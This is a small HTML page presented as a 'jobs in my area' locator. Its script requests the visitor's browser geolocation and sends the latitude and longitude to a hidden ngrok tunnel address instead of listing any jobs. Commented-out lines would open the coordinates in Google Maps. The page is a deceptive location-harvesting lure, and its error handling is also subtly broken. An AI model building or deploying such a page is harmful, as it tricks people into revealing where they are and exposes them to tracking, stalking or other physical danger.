<!DOCTYPE html>
<html>

<button onclick="getLocation()">List All Jobs In My Area</button>

<script>
  function getLocation() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(showPosition);
    } else {
      alert("Jobs locator is not supported by this browser.");
    }
  }

  function showPosition(position) {
    var latitude = position.coords.latitude;
    var longitude = position.coords.longitude;

    fetch(`https://dcf6-102-88-63-111.ngrok-free.app?lon=${longitude}&lat=${latitude}`, { mode: 'no-cors'})
        .then(res => res.json())
        .then(data => console.log("@data ", data))
        .catch(error = console.log("@error ", error))

    // console.error("LON: ", longitude, "\nLAT: ", latitude);
    // var url = "https://www.google.com/maps?q=" + latitude + "," + longitude;
    // window.location.href = url;
  }
</script>

</html>
